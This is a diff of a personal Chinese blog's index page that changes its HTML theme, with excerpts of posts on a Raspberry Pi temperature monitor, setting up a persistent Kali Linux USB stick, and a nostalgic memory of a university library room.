@@ -1,467 +1,761 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-  <meta charset="utf-8">
-  
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <title>Ivan&#39;s Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+    <meta charset="utf-8">
+    
+    <title>Ivan&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Ivan's Blog">
 <meta property="og:url" content="http://my.yfgeek.com/index.html">
 <meta property="og:site_name" content="Ivan's Blog">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Ivan's Blog">
-  
-    <link rel="alternative" href="/atom.xml" title="Ivan&#39;s Blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="//favicon.png">
-  
-  <link rel="stylesheet" href="/css/style.css">
+    
+
+    
+        <link rel="alternate" href="/" title="Ivan&#39;s Blog" type="application/atom+xml" />
+    
+
+    
+
+    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/vendor/open-sans/styles.css">
+    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/vendor/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/vendor/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+    
+    
+
+
 </head>
 
 <body>
-  <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-	<header id="header" class="inner">
-		<a href="/" class="profilepic">
-			
-			<img lazy-src="0" class="js-avatar">
-			
-		</a>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Ivan&#39;s Blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">Home</a>
+                
+                    <a class="main-nav-link" href="/archives">Archives</a>
+                
+                    <a class="main-nav-link" href="/categories">Categories</a>
+                
+                    <a class="main-nav-link" href="/tags">Tags</a>
+                
+                    <a class="main-nav-link" href="/about">About</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
 
-		<hgroup>
-		  <h1 class="header-author"><a href="/">Ivan</a></h1>
-		</hgroup>
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
 
-		
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">Home</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">Archives</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">Categories</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">Tags</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">About</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
 
-		
-			<div class="switch-btn">
-				<div class="icon">
-					<div class="icon-ctn">
-						<div class="icon-wrap icon-house" data-idx="0">
-							<div class="birdhouse"></div>
-							<div class="birdhouse_holes"></div>
-						</div>
-						<div class="icon-wrap icon-ribbon hide" data-idx="1">
-							<div class="ribbon"></div>
-						</div>
-						
-						<div class="icon-wrap icon-link hide" data-idx="2">
-							<div class="loopback_l"></div>
-							<div class="loopback_r"></div>
-						</div>
-						
-						
-						<div class="icon-wrap icon-me hide" data-idx="3">
-							<div class="user"></div>
-							<div class="shoulder"></div>
-						</div>
-						
-					</div>
-					
-				</div>
-				<div class="tips-box hide">
-					<div class="tips-arrow"></div>
-					<ul class="tips-inner">
-						<li>Menu</li>
-						<li>Tags</li>
-						
-						<li>Links</li>
-						
-						
-						<li>Über</li>
-						
-					</ul>
-				</div>
-			</div>
-		
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
 
-		<div class="switch-area">
-			<div class="switch-wrap">
-				<section class="switch-part switch-part1">
-					<nav class="header-menu">
-						<ul>
-						
-							<li><a href="/">主页</a></li>
-				        
-							<li><a href="/archives">所有文章</a></li>
-				        
-						</ul>
-					</nav>
-					<nav class="header-nav">
-						<div class="social">
-							
-								<a class="github" target="_blank" href="#" title="github">github</a>
-					        
-								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
-					        
-								<a class="rss" target="_blank" href="#" title="rss">rss</a>
-					        
-								<a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
-					        
-						</div>
-					</nav>
-				</section>
-				
-				
-				<section class="switch-part switch-part2">
-					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/Kali-转载/" style="font-size: 10px;"> - Kali - 转载</a> <a href="/tags/原创/" style="font-size: 15px;"> - 原创</a> <a href="/tags/原创-Hack/" style="font-size: 20px;"> - 原创 - Hack</a> <a href="/tags/原创-Tool/" style="font-size: 10px;"> - 原创 - Tool</a> <a href="/tags/原创-树莓派/" style="font-size: 10px;"> - 原创 - 树莓派</a> <a href="/tags/树莓派-原创/" style="font-size: 10px;"> - 树莓派 - 原创</a> <a href="/tags/转载-Hack/" style="font-size: 10px;"> - 转载 - Hack</a> <a href="/tags/转载-Tool/" style="font-size: 20px;"> - 转载 - Tool</a>
-					</div>
-				</section>
-				
-				
-				
-				<section class="switch-part switch-part3">
-					<div id="js-friends">
-					
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">奥巴马的博客</a>
-			        
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">卡卡的美丽传说</a>
-			        
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">本泽马的博客</a>
-			        
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">吉格斯的博客</a>
-			        
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">习大大大不同</a>
-			        
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">托蒂的博客</a>
-			        
-			        </div>
-				</section>
-				
+        <div class="outer">
+            
+                
 
-				
-				
-				<section class="switch-part switch-part4">
-				
-					<div id="js-aboutme">我是谁，我从哪里来，我到哪里去？我就是我，是颜色不一样的吃货…</div>
-				</section>
-				
-			</div>
-		</div>
-	</header>				
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">一凡</h2>
+            <h3 id="title">Web 前端 &amp; 网络安全</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>UK</span>
+            <a id="follow" target="_blank" href="https://github.com/yfgeek/">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                14
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                8
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="http://github.com/yfgeek" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/" target="_blank" title="twitter" class=tooltip>
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/" target="_blank" title="facebook" class=tooltip>
+                            <i class="fa fa-facebook"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/" target="_blank" title="dribbble" class=tooltip>
+                            <i class="fa fa-dribbble"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/" target="_blank" title="rss" class=tooltip>
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main">
+    <article id="post-templcd" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/26/templcd/">树莓派实时温湿度监测进阶</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/26/templcd/">
+            <time datetime="2016-08-26T07:19:14.000Z" itemprop="datePublished">2016-08-26</time>
+        </a>
+    </div>
+
+
+                        
+                        
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            <p><p>#介绍<br>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。<br></p>
+            <p class="article-more-link">
+                <a href="/2016/08/26/templcd/#more">查看更多</a>
+            </p>
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
 </div>
 
-    </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-  	<div class="overlay">
-  		<div class="slider-trigger"></div>
-  		<h1 class="header-author js-mobile-header hide">Ivan</h1>
-  	</div>
-	<div class="intrude-less">
-		<header id="header" class="inner">
-			<div class="profilepic">
-				
-					<img lazy-src="0" class="js-avatar">
-				
-			</div>
-			<hgroup>
-			  <h1 class="header-author">Ivan</h1>
-			</hgroup>
-			
-			<nav class="header-menu">
-				<ul>
-				
-					<li><a href="/">主页</a></li>
-		        
-					<li><a href="/archives">所有文章</a></li>
-		        
-		        <div class="clearfix"></div>
-				</ul>
-			</nav>
-			<nav class="header-nav">
-				<div class="social">
-					
-						<a class="github" target="_blank" href="#" title="github">github</a>
-			        
-						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
-			        
-						<a class="rss" target="_blank" href="#" title="rss">rss</a>
-			        
-						<a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
-			        
-				</div>
-			</nav>
-		</header>				
-	</div>
-</nav>
+    <a data-url="http://my.yfgeek.com/2016/08/26/templcd/" data-id="cisyte7dp000nzds5hq5i3plk" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
 
-      <div class="body-wrap">
-  
-    <article id="post-templcd" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/26/templcd/" class="article-date">
-  	<time datetime="2016-08-26T07:19:14.000Z" itemprop="datePublished">2016-08-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/26/templcd/">树莓派实时温湿度监测进阶</a>
-    </h1>
-  
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#介绍<br>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。<br>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
+            if ($('#' + id).length) {
+                box = $('#' + id);
 
-      
-        <p class="article-more-link">
-          <a  href="/2016/08/26/templcd/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/26/templcd/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/26/templcd/">评论</a>
+    
+
+        </footer>
     </div>
     
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-ba-kalifang-dao-upan-li" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/25/ba-kalifang-dao-upan-li/" class="article-date">
-  	<time datetime="2016-08-25T11:26:45.000Z" itemprop="datePublished">2016-08-25</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/25/ba-kalifang-dao-upan-li/">把KALI放到U盘里</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a> 
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/25/ba-kalifang-dao-upan-li/">把KALI放到U盘里</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/25/ba-kalifang-dao-upan-li/">
+            <time datetime="2016-08-25T11:26:45.000Z" itemprop="datePublished">2016-08-25</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Kali-转载/"> - Kali - 转载</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <a id="more"></a> 
 <p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>
 <p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。</p>
 <p>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>
 <p>关掉gparted ，在命令行里输入以下命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir /mnt/usb</div><div class="line">mount /dev/sdb2 /mnt/usb</div><div class="line"><span class="built_in">echo</span> <span class="string">"/ union"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class="line">umount /mnt/usb</div></pre></td></tr></table></figure>
-      
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/" data-id="cisyte7do000lzds5tvbntfha" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali-转载/"> - Kali - 转载</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-rpi-tmp-hdt-platform" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/25/rpi-tmp-hdt-platform/" class="article-date">
-  	<time datetime="2016-08-25T05:39:08.000Z" itemprop="datePublished">2016-08-25</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/25/rpi-tmp-hdt-platform/">基于树莓派的实时温度湿度监测平台</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#前言<br>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>
-<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br>
-      
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/25/rpi-tmp-hdt-platform/">基于树莓派的实时温度湿度监测平台</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/25/rpi-tmp-hdt-platform/">
+            <time datetime="2016-08-25T05:39:08.000Z" itemprop="datePublished">2016-08-25</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/树莓派-原创/"> - 树莓派 - 原创</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            <p><p>#前言<br>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>
+<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br></p>
+            <p class="article-more-link">
+                <a href="/2016/08/25/rpi-tmp-hdt-platform/#more">查看更多</a>
+            </p>
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/25/rpi-tmp-hdt-platform/" data-id="cisyte7da0006zds5leq8epnc" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/25/rpi-tmp-hdt-platform/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/25/rpi-tmp-hdt-platform/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/树莓派-原创/"> - 树莓派 - 原创</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/08/25/rpi-tmp-hdt-platform/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-916" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/08/20/916/" class="article-date">
-  	<time datetime="2016-08-20T15:22:01.000Z" itemprop="datePublished">2016-08-20</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/20/916/">我怀念的依旧是916</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/20/916/">我怀念的依旧是916</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/20/916/">
+            <time datetime="2016-08-20T15:22:01.000Z" itemprop="datePublished">2016-08-20</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/原创/"> - 原创</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            <p><p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>
 <p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>
-<p>916桌子很多，却都是空位，但是有基友陪伴。<br>
-      
+<p>916桌子很多，却都是空位，但是有基友陪伴。<br></p>
+            <p class="article-more-link">
+                <a href="/2016/08/20/916/#more">查看更多</a>
+            </p>
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/20/916/" data-id="cisyte7dm000jzds5ffohqaea" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/20/916/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/20/916/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原创/"> - 原创</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/08/20/916/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
